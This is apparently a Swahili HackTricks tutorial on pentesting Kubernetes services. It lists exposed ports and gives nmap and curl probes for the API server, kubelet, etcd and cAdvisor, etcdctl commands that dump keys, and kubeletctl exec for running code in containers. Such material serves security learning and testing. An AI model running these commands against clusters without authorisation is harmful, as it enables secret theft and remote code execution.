# Pentesting Huduma za Kubernetes

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Kubernetes hutumia **huduma za mtandao maalum** ambazo unaweza kuzipata **zikiwa wazi kwa Ulimwengu wa Mtandao** au kwenye **mtandao wa ndani mara baada ya kudukua pod moja**.

## Kutafuta pods zilizofichuliwa kwa OSINT

Moja ya njia inaweza kuwa kutafuta `Identity LIKE "k8s.%.com"` katika [crt.sh](https://crt.sh) ili kupata subdomains zinazohusiana na kubernetes. Njia nyingine inaweza kuwa kutafuta `"k8s.%.com"` kwenye github na kutafuta **faili za YAML** zenye neno hilo.

## Jinsi Kubernetes Inavyofichua Huduma

Inaweza kuwa muhimu kwako kuelewa jinsi Kubernetes inavyoweza **kufichua huduma kwa umma** ili kuzipata:

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## Kutafuta Pods Zilizofichuliwa kupitia uchunguzi wa bandari

Bandari zifuatazo zinaweza kuwa wazi kwenye kikundi cha Kubernetes:

| Bandari         | Mchakato        | Maelezo                                                                |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Bandari ya API ya Kubernetes                                           |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | Vipimo vya kontena                                                     |
| 6443/TCP        | kube-apiserver | Bandari ya API ya Kubernetes                                           |
| 8443/TCP        | kube-apiserver | Bandari ya API ya Minikube                                              |
| 8080/TCP        | kube-apiserver | Bandari isiyo salama ya API                                             |
| 10250/TCP       | kubelet        | API ya HTTPS inayoruhusu ufikiaji kamili                               |
| 10255/TCP       | kubelet        | Bandari ya HTTP isiyothibitishwa ya kusoma tu: pods, pods zinazoendesha na hali ya node |
| 10256/TCP       | kube-proxy     | Seva ya uchunguzi wa afya ya Kube Proxy                                |
| 9099/TCP        | calico-felix   | Seva ya uchunguzi wa afya ya Calico                                    |
| 6782-4/TCP      | weave          | Vipimo na vituo vya mwisho                                              |
| 30000-32767/TCP | NodePort       | Proksi kwa huduma                                                      |
| 44134/TCP       | Tiller         | Huduma ya Helm inayosikiliza                                           |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

Hii ni **huduma ya API ya Kubernetes** ambayo waendeshaji wanazungumza nayo kawaida kwa kutumia zana ya **`kubectl`**.

**Bandari za kawaida: 6443 na 443**, lakini pia 8443 katika minikube na 8080 kama isiyo salama.
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**Angalia ukurasa ufuatao kujifunza jinsi ya kupata data nyeti na kutekeleza hatua nyeti zikizungumza na huduma hii:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

Huduma hii **inaendeshwa kwenye kila node ya kikundi**. Ni huduma itakayosaidia **kudhibiti** pods ndani ya **node**. Inazungumza na **kube-apiserver**.

Ukipata huduma hii imefunuliwa unaweza kuwa umepata **RCE isiyo na uthibitisho**. 

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
Ikiwa jibu ni `Unauthorized` basi inahitaji uwakilishi.

Ikiwa unaweza kuorodhesha nodes unaweza kupata orodha ya kubelets endpoints kwa:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet (Soma tu)
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller

### Tiller
```
helm --host tiller-deploy.kube-system:44134 version
```
Ungekuwa unaweza kutumia huduma hii kwa kujipandisha hadhi ndani ya Kubernetes:

### cAdvisor

Huduma inayofaa kwa kukusanya takwimu.
```
curl -k https://<IP Address>:4194
```
### NodePort

Wakati bandari inafunuliwa kwenye wote **NodePort**, bandari hiyo hiyo inafunguliwa kwenye wote **nodes** ikipeleka trafiki kwenye **Service** iliyotajwa. Kwa chaguo-msingi bandari hii itakuwa katika **mbalimbali 30000-32767**. Kwa hivyo huduma mpya ambazo hazijachunguzwa zinaweza kupatikana kupitia bandari hizo.
```
sudo nmap -sS -p 30000-32767 <IP>
```
## Mipangilio Hatarishi

### Upatikanaji wa Kube-apiserver Bila Jina

Upatikanaji wa **endpoints za API za kube-apiserver hauruhusiwi**. Lakini unaweza kuangalia baadhi ya endpoints:

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **Kuangalia Upatikanaji wa ETCD Bila Jina**

ETCD huhifadhi siri za kikundi, faili za usanidi na **data nyeti zaidi**. Kwa **chaguo-msingi**, ETCD **haiwezi** kupatikana **kwa njia isiyojulikana**, lakini ni vizuri kuchunguza.

Ikiwa ETCD inaweza kupatikana kwa njia isiyojulikana, unaweza **kutumia** [**zana ya etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md). Amri ifuatayo itapata funguo zote zilizohifadhiwa:
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

[**Hati
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
All of them sound interesting.

Unaweza kutumia zana ya [**Kubeletctl**](https://github.com/cyberark/kubeletctl) kuingiliana na Kubelets na vituo vyao.

#### /pods

Hii ni mwisho wa orodha ya pods na vyombo vyao:
```bash
kubeletctl pods
```
#### /exec

Hii endpoint inaruhusu kutekeleza nambari ndani ya chombo chochote kwa urahisi sana:
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
Ili kuepuka shambulizi hili huduma ya _**kubelet**_ inapaswa kuendeshwa na `--anonymous-auth false` na huduma inapaswa kutengwa kwenye kiwango cha mtandao.
{% endhint %}

### **Kuangalia Ufunuo wa Taarifa za Kubelet (Bandari ya Kusoma tu)**

Wakati bandari ya kusoma tu ya **kubelet** inafunuliwa, inawezekana kupata taarifa kutoka kwa API na vyama visivyoruhusiwa. Ufunuo wa bandari hii unaweza kusababisha ufunuo wa vipengele mbalimbali vya **usawazishaji wa kikundi**. Ingawa taarifa, ikiwa ni pamoja na **majina ya podi, maeneo ya faili za ndani, na mipangilio mingine**, inaweza isiwe muhimu sana, ufunuo wake bado unaweka hatari ya usalama na inapaswa kuepukwa.

Mfano wa jinsi udhaifu huu unaweza kutumika ni pamoja na mshambuliaji wa mbali kupata URL maalum. Kwa kuingia kwenye `http://<external-IP>:10255/pods`, mshambuliaji anaweza kupata taarifa nyeti kutoka kwa kubelet:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## Marejeo

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
